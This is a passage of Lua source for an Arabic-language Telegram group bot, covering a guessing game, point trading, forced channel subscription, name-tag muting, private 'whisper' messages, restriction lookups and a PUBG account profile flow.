if KASPERdx1:get(KASPER.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
KASPERdx(msg.chat_id_, msg.id_, 1,"✟︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = KASPERdx1:get(KASPER.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
KASPERdx1:del(KASPER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
KASPERdx1:del(KASPER.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
KASPERdx1:incrby(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
KASPERdx(msg.chat_id_, msg.id_, 1,'*✟︙التخمين الصحيح هو* ~ '..NUM..'\n*✟︙مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
KASPERdx1:incrby(KASPER..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(KASPERdx1:get(KASPER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
KASPERdx1:del(KASPER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
KASPERdx1:del(KASPER.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
KASPERdx(msg.chat_id_, msg.id_, 1,'*✟︙التخمين الصحيح هو*  '..GETNUM..'\n*✟︙للاسف لقد خسرت حاول مره اخرى\n✟︙للعب مره اخره ارسل ( تخمين )*', 1, 'md')
else
if tonumber(KASPERdx1:get(KASPER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(KASPERdx1:get(KASPER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
KASPERdx(msg.chat_id_, msg.id_, 1,'✟︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and KASPER11(msg) or text == 'تخمين' and KASPER11(msg) then   
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
Num = math.random(1,20)
KASPERdx1:set(KASPER.."GAMES:NUM"..msg.chat_id_,Num) 
KASPERdx(msg.chat_id_, msg.id_, 1,'✟︙اهلا بك عزيزي في لعبة التخمين  \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙سيتم تخمين عدد ما بين الـ1 والـ20 .\n✟︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !\n✟︙بدأت اللعبه ارسل لي تخمينك الان', 1, 'md')
KASPERdx1:setex(KASPER.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
--     By Developer KASPER     -- 
if text == 'الالعاب' or text == 'اللعبه' and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1,[[*
✟︙اهلا بك في قائمه الالعاب ↓↓
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙الالعاب المتوفره بالبوت ↓↓
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙ارسل امر { تخمين } لبدء لعبه
✟︙ارسل امر { كت تويت } لبدء لعبه
✟︙ارسل امر { ترتيب } لبدء لعبه 
✟︙ارسل امر { سمايلات } لبدء لعبه 
✟︙ارسل امر { حزوره } لبدء لعبه 
✟︙ارسل امر { المعاني } لبدء لعبه 
✟︙ارسل امر { العكس } لبدء لعبه 
✟︙ارسل امر { المحيبس } لبدء لعبه 
✟︙ارسل امر { امثله } لبدء لعبه 
✟︙ارسل امر { المختلف } لبدء لعبه 
✟︙ارسل امر { انكليزي } لبدء لعبه 
✟︙ارسل امر { رياضيات } لبدء لعبه 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙قناة السورس *[@KASPER_ch] 
]], 1, 'md')
end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") and text:match("^ضع عدد النقاط (%d+)$")  then
local dx1 = { string.match(text, "^(ضع عدد النقاط) (%d+)$")}
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم وضع عدد نقاط البيع\n✟︙يمكن للعضو بيع نقاط اللعبه\n✟︙اذا كان عدد نقاطه اكبر من~ *"..dx1[2].."*\n",1, 'md')
KASPERdx1:set(KASPER.."KASPER_OO0" .. msg.chat_id_, dx1[2])
return false end
--     By Developer KASPER     -- 
if text == 'بيع نقاطي' and KASPER11(msg) then
if tonumber((KASPERdx1:get(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
KASPER0 = '✟︙ليس لديك نقاط العب اولا ، \n✟︙للعب ارسل { الالعاب } لرؤيه الالعاب المتاحه '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER0, 1, 'md') 
else
KASPER0 = (KASPERdx1:get(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(KASPERdx1:get('KASPER:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
KASPERdx1:incrby('KASPER:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,KASPER0)  
KASPERdx1:del(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_)
KASPER0 = tonumber((KASPERdx1:get('KASPER:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
KASPERdx(msg.chat_id_, msg.id_, 1,'✟︙تم بيع نقاطك \n✟︙كل نقطه تساوي  '..KASPER0..' رساله ', 'md')
end end
--     By Developer KASPER     -- 
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" and KASPER11(msg) then
if not is_leader(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ للمطور الاساسي فقط ', 1, 'md')
else
KASPERdx1:setex(KASPER..'KASPER4'..msg.sender_user_id_,300,true)
KASPERdx(msg.chat_id_,msg.id_, 1, "*✟︙ارسل لي معرف قناة الاشتراك *\n", 1 , "md")
end end
--     By Developer KASPER     -- 
if text == 'تفعيل الاشتراك الاجباري' then
if not is_leader(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ للمطور الاساسي فقط ', 1, 'md')
else
if not KASPERdx1:get(KASPER..'KASPER3') then
KASPERdx(msg.chat_id_,msg.id_, 1, "*✟︙لم يتم تعيين القناة ، \n✟︙ارسل تعيين قناة الاشتراك . *", 1 , "md")
return false 
end
if KASPERdx1:get(KASPER..'KASPER3') then
KASPERdx(msg.chat_id_,msg.id_, 1, "*✟︙تم تفعيل الاشتراك الاجباري ، \n✟︙تاكد من رفعي ادمن في قناتك .*", 1 , "md")
KASPERdx1:set(KASPER.."KASPER2", true)
return false end end end
--     By Developer KASPER     -- 
if text == 'تعطيل الاشتراك الاجباري' then
if not is_leader(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ للمطور الاساسي فقط ', 1, 'md')
else
KASPERdx(msg.chat_id_,msg.id_, 1, "*✟︙تم تعطيل الاشتراك الاجباري ، *\n", 1 , "md")
KASPERdx1:del(KASPER.."KASPER2")
return false 
end end
--     By Developer KASPER     -- 
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' then
if not is_leader(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ للمطور الاساسي فقط ', 1, 'md')
else
local KASPER5 = KASPERdx1:get(KASPER.."KASPER3")
if KASPER5 then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*قناة الاشتراك* : ['..KASPER5..']', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لم يتم تعيين القناة ', 1, 'md')
end end end
--     By Developer KASPER     --
if text == "وضع شعار" or text == "ضع شعار" then 
KASPERdx1:set("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_,"KASPER")
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الشعار الان", 1, 'md')
return "KASPER"
end
if KASPERdx1:get("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تعيين : { "..text.." }", 1, 'md')
KASPERdx1:del("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_)
KASPERdx1:set("tohd1"..bot_id..msg.chat_id_,text)
end
if text == "تعين عدد الكتم" or text == "تعيين عدد الكتم" or text == "ضع عدد الكتم" or text == "وضع عدد الكتم" then
KASPERdx(msg.chat_id_, msg.id_, 1, " ✟︙ارسل لي عدد الكتم", 1, 'md')
KASPERdx1:set("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_,"KASPER")
return "KASPER"
end
if KASPERdx1:get("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تعيين : { "..text.." } عدد لكتم العضو", 1, 'md')
KASPERdx1:del("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_)
KASPERdx1:set("tohd"..bot_id..msg.chat_id_,text)
end  
if text == "تفعيل الشعار" then 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تفعيل الشعار", 1, 'md')
KASPERdx1:set("tohd1_Dx"..bot_id..msg.chat_id_,"Dx")
end
if text == "تعطيل الشعار" then 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تعطيل الشعار", 1, 'md')
KASPERdx1:del("tohd1_Dx"..bot_id..msg.chat_id_)
end

if not msg.forward_info_  then
if KASPERdx1:get("tohd1_Dx"..bot_id..msg.chat_id_) and KASPERdx1:get("tohd1"..bot_id..msg.chat_id_) then 
id = msg.sender_user_id_
function KASPER_KASPERDx(KASPERDx1,KASPERDx2)
if KASPERDx2 and KASPERDx2.first_name_ then 
if KASPERDx2.first_name_:match("(.*)"..KASPERdx1:get("tohd1"..bot_id..msg.chat_id_).."(.*)") then 
KASPERdx1:srem('KASPERDx:'..bot_id..'muted:'..msg.chat_id_, msg.sender_user_id_)
else
local KASPERDx_F = KASPERdx1:get("tohd"..bot_id..msg.chat_id_) or 5
local KASPERDx_F2 = KASPERdx1:get("tohd22"..bot_id..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(KASPERDx_F2) == tonumber(KASPERDx_F) or tonumber(KASPERDx_F2) > tonumber(KASPERDx_F)) then 
KASPERdx1:sadd(KASPER..'bot:muted:'..msg.chat_id_, msg.sender_user_id_)
else
KASPERdx1:incrby("tohd22"..bot_id..msg.chat_id_..msg.sender_user_id_,1)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙عزيزي  ["..KASPERDx2.first_name_.."](https://t.me/"..(KASPERDx2.username_ or "KASPER_ch")..")\n✟︙عليك وضع الشعار  { `"..KASPERdx1:get("tohd1"..bot_id..msg.chat_id_).."` } بجانب اسمك\n✟︙عند انتهاء المحاولات سيتم كتمك\n\n✟︙عدد المحاولات المتبقيه {"..(tonumber(KASPERDx_F) - tonumber(KASPERDx_F2)).."}", 1, 'md')
end end end end
getUser(id, KASPER_KASPERDx)
end end 
--     By Developer KASPER     -- 
local msg = data.message_
text = msg.content_.text_ 
if not KASPERdx1:get(KASPER..'TFF'..msg.chat_id_) then
if text and text:match("^اهمس (.*) (.*)") then 
text = text:gsub('@',"")
faed_dx = {string.match(text, "اهمس (.*) (.*)")}
function hamss(res1,res2)
if not res2.id_ then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙المعرف غير صحيح ، ', 1, 'html')
return "dx"
end
function hamssss(ress1,ress2)
if (ress2 and ((ress2.status_ and ress2.status_.ID == "ChatMemberStatusLeft") or ress2.ID == "Error")) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙العضو غير موجود بالمجموعه ، ', 1, 'html')
return "dx"
end
tdcli_function ({
ID="DeleteMessages",
chat_id_= msg.chat_id_,
message_ids_= {[0] = msg.id_}
}, 
dl_cb, nil)
KASPERdx1:set(KASPER.."HM:"..msg.chat_id_..msg.id_..res2.id_,faed_dx[1])
function bot_id_get(ros1,ros2)
bot_username = (ros2.username_ or "DX_XBOT")
function Dxx(ross1,ross2)
local hms = msg.sender_user_id_
if ross2.username_ then 
hms = "@"..ross2.username_
end
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙هذه همسه سريه الى { @["..faed_dx[2].."] }\n✟︙مرسله من { ["..hms.."] }\n✟︙هو فقط من يستطيع رويتها\n✟︙[اضغط هنا لعرض الهمسه](https://t.me/"..bot_username.."?start=hms"..msg.chat_id_..msg.id_.."_"..res2.id_..") •", 1, 'md')
end
getUser(msg.sender_user_id_, Dxx)
end
getUser(bot_id, bot_id_get)
end
tdcli_function ({
ID = "GetChatMember",
chat_id_ = msg.chat_id_,
user_id_ = res2.id_
}, hamssss, nil)
end
resolve_username(faed_dx[2],hamss) 
end end
--     By Developer KASPER     -- 
if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" and KASPER11(msg) then  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙يمكنك من خلال هذا البوت\n✟︙ارسال همسه سريه للاعضاء \n✟︙الامر كالاتي مثال : اهمس هلو [@KKKKF]', 1, 'md')
end
if text and text:match("/start hms(.*)_(%d+)") then 
faed_dx = {string.match(text, "^/start hms(.*)_(%d+)")}
if tonumber(msg.sender_user_id_) == tonumber(faed_dx[2]) then 
KASPER = KASPERdx1:get(KASPER.."HM:"..faed_dx[1]..faed_dx[2])
if KASPER then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الهمسه هي\n✟︙{ ['..KASPER..'] }', 1, 'md')
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙اثكل الهمسه مو الك ،', 1, 'md')
end else 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙اثكل الهمسه مو الك ،', 1, 'md')
end end
--     By Developer KASPER     -- 
if text == 'رفع المشرفين' or text == 'رفع الادمنيه' and KASPER11(msg) then  
local function promote_admin(extra, result, success)  
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
KASPERdx1:sadd(KASPER..'bot:momod:'..msg.chat_id_, admins[i].user_id_)   
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
owner_id = admins[i].user_id_  
KASPERdx1:sadd(KASPER..'bot:monsh:'..msg.chat_id_,owner_id)   
end end  
KASPERdx(msg.chat_id_, msg.id_, 1, '\n*✟︙تم رفع ('..num..') ادمنيه هنا ، \n✟︙تم رفع منشئ المجموعه . *', 1, 'md')
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text == "فحص" or text == "فحص البوت" and KASPER11(msg) then
local check = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..KASPER)
local GetInfo = JSON.decode(check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙شغال وصلاحياته هي ⬇️\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙حذف الرسائل ، '..DEL..'\n✟︙دعوة المستخدمين ، '..INV..'\n✟︙حظر المستخدمين ، '..BAN..'\n✟︙تثبيت الرسائل ، '..PIN..'\n✟︙تغيير المعلومات ، '..EDT..'\n✟︙اضافة مشرفين ، '..VIP..'\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙قناة السورس ، [@KASPER_Ch]', 1, 'md')
end end end
--     By Developer KASPER     --
if text and text:match("^تغير رد المطور (.*)$") then
local Text = text:match("^تغير رد المطور (.*)$") 
KASPERdx1:set(KASPER.."bot:sudo3:add"..msg.chat_id_,Text)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تغير رد المطور الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
KASPERdx1:set(KASPER.."bot:monsh:add"..msg.chat_id_,Text)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تغير رد المنشئ الاساسي الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") then
local Text = text:match("^تغير رد المنشئ (.*)$") 
KASPERdx1:set(KASPER.."bot:monsh2"..msg.chat_id_,Text)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تغير رد المنشئ الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") then
local Text = text:match("^تغير رد المدير (.*)$") 
KASPERdx1:set(KASPER.."bot:owner:add"..msg.chat_id_,Text) 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تغير رد المدير الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") then
local Text = text:match("^تغير رد الادمن (.*)$") 
KASPERdx1:set(KASPER.."bot:momod:add"..msg.chat_id_,Text)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تغير رد الادمن الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") then
local Text = text:match("^تغير رد المميز (.*)$") 
KASPERdx1:set(KASPER.."bot:vepmem:add"..msg.chat_id_,Text)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تغير رد المميز الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") then
local Text = text:match("^تغير رد العضو (.*)$") 
KASPERdx1:set(KASPER.."bot:member:add"..msg.chat_id_,Text)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تغير رد العضو الى : "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حذف جميع ردود الرتب", 1, 'md')
KASPERdx1:del(KASPER.."bot:sudo3:add"..msg.chat_id_)
KASPERdx1:del(KASPER.."bot:monsh:add"..msg.chat_id_)
KASPERdx1:del(KASPER.."bot:monsh2"..msg.chat_id_)
KASPERdx1:del(KASPER.."bot:owner:add"..msg.chat_id_)
KASPERdx1:del(KASPER.."bot:momod:add"..msg.chat_id_)
KASPERdx1:del(KASPER.."bot:vepmem:add"..msg.chat_id_)
KASPERdx1:del(KASPER.."bot:member:add"..msg.chat_id_)
end
--     By Developer KASPER     -- 
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then 
function kshf_by_reply(extra, result, success)
if KASPERdx1:sismember(KASPER..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if KASPERdx1:sismember(KASPER..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if KASPERdx1:sismember(KASPER..'bot:gban:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if KASPERdx1:sismember(KASPER..'bot:mutedall:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if KASPERdx1:sismember(KASPER..'tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الحظر : '..banned..'\n✟︙الكتم : '..muted..'\n✟︙التقيد : '..tkeed..'\n✟︙الحظر العام : '..banall..'\n✟︙الكتم العام : '..muteall..'', 1, 'md') 
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if KASPERdx1:sismember(KASPER..'bot:muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if KASPERdx1:sismember(KASPER..'bot:banned:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if KASPERdx1:sismember(KASPER..'bot:gban:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if KASPERdx1:sismember(KASPER..'bot:mutedall:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if KASPERdx1:sismember(KASPER..'tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الحظر : '..banned..'\n✟︙الكتم : '..muted..'\n✟︙التقيد : '..tkeed..'\n✟︙الحظر العام : '..banall..'\n✟︙الكتم العام : '..muteall..'', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(KASPER) then  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم رفع قيوده")  
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
KASPERdx1:srem(KASPER..'tkeed:'..msg.chat_id_,result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:banned:'..msg.chat_id_,result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:muted:'..msg.chat_id_,result.sender_user_id_)   
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and Admin(msg) and KASPER11(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(KASPER) then  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
Send_Options(msg,user,"reply","✟︙تم رفع قيوده")  
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
KASPERdx1:srem(KASPER..'tkeed:'..msg.chat_id_,user) KASPERdx1:srem(KASPER..'bot:banned:'..msg.chat_id_,user) KASPERdx1:srem(KASPER..'bot:muted:'..msg.chat_id_,user)   
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*المعرف غير صحيح*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙هذا معرف قناة وليس معرف حساب', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(KASPER) then  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
Send_Options(msg,result.id_,"reply","✟︙تم رفع قيوده")  
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
KASPERdx1:srem(KASPER..'tkeed:'..msg.chat_id_,result.id_) KASPERdx1:srem(KASPER..'bot:banned:'..msg.chat_id_,result.id_) KASPERdx1:srem(KASPER..'bot:muted:'..msg.chat_id_,result.id_)   
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     By Developer KASPER     -- 
 if is_admin(msg.sender_user_id_, msg.chat_id_) then
name_bot = (KASPERdx1:get('KASPER:'..bot_id..'name_bot') or 'فايدر')
if text ==  ""..name_bot..' غادر' and KASPER11(msg) then
chat_leave(msg.chat_id_, bot_id)
KASPERdx1:srem(KASPER.."bot:groups",msg.chat_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم مغادره المجموعه وحذف بياناتها ، ', 1, 'md')
end end
--     By Developer KASPER     -- 
if text == 'تعطيل تنبيه الدخول' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙ تعطيل تنبيه الدخول ،', 'md')  
KASPERdx1:set(KASPER.."UnKedDeleteMessage"..msg.chat_id_,"close") 
end
if text == 'تفعيل تنبيه الدخول' and is_owner(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙ تفعيل تنبيه الدخول ،', 'md')
KASPERdx1:set(KASPER.."UnKedDeleteMessage"..msg.chat_id_,"open") 
end
--     By Developer KASPER     -- 
if text and text == 'تفعيل وضع حسابي' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if not KASPERdx1:get(KASPER..'bot:pubgacuount'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙تم تفعيل وضع حسابي سابقا ،', 'md')  
else
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙تم تفعيل وضع حسابي ،', 'md')
KASPERdx1:del(KASPER..'bot:pubgacuount'..msg.chat_id_)
end end
if text and text == 'تعطيل وضع حسابي' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:pubgacuount'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙تم تعطيل وضع حسابي سابقا ،', 'md') 
else
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙تم تعطيل وضع حسابي ،', 'md')
KASPERdx1:set(KASPER..'bot:pubgacuount'..msg.chat_id_,true)
end end
--     By Developer KASPER     -- 
  if not KASPERdx1:get(KASPER..'bot:pubgacuount'..msg.chat_id_) then
if (text and text == 'وضع حسابي') and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙ارسل لي اسم حسابك ،  ', 'html')
KASPERdx1:set(KASPER..'bot:n1'..msg.sender_user_id_..'','yes')
return false end 
local KASPER = KASPERdx1:get(KASPER..'bot:n1'..msg.sender_user_id_)
if KASPER == 'yes' then
if text:match("^(.*)$") then
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙تم حفظ الاسم . ✔️\n✟︙ارسل ايدي حسابك ،\n  ', 'md')
KASPERdx1:set(KASPER..'bot:n1'..msg.sender_user_id_..'','no')
KASPERdx1:set(KASPER..'bot:name_acount'..msg.sender_user_id_, text)
KASPERdx1:set(KASPER..'bot:n2'..msg.sender_user_id_ ,'yes')
return false end
end 
local KASPER = KASPERdx1:get(KASPER..'bot:n2'..msg.sender_user_id_)
if KASPER == 'yes' then
if text:match("^(%d+)$") then
KASPERdx1:set(KASPER..'bot:idacount'..msg.sender_user_id_, text)
KASPERdx1:set(KASPER..'bot:n2'..msg.sender_user_id_, 'no')
local aa = [[
✟︙تم حفظ ايديك ✅
✟︙ارسل لي تقييمك كمثال :- 

- برونز 1 
- كولد 2
- بلاتينيوم 3
- دايموند 4 
- كراون 5 
- ايس 
- كونكر 
]]
KASPERdx(msg.chat_id_, msg.id_, 1, aa , 1, 'html')
KASPERdx1:set(KASPER..'bot:n3'..msg.sender_user_id_, 'yes')
return false 
else 
return false end
end 
local KASPER = KASPERdx1:get(KASPER..'bot:n3'..msg.sender_user_id_)
if KASPER == 'yes' then
if text:match("^برونز (%d+)$") or text:match("^كولد (%d+)$") or text:match("^بلاتينيوم (%d+)$") or text:match("^دايموند (%d+)$") or text:match("^كراون (%d+)$") or text:match("^ايس$") or text:match("^كونكر$") then
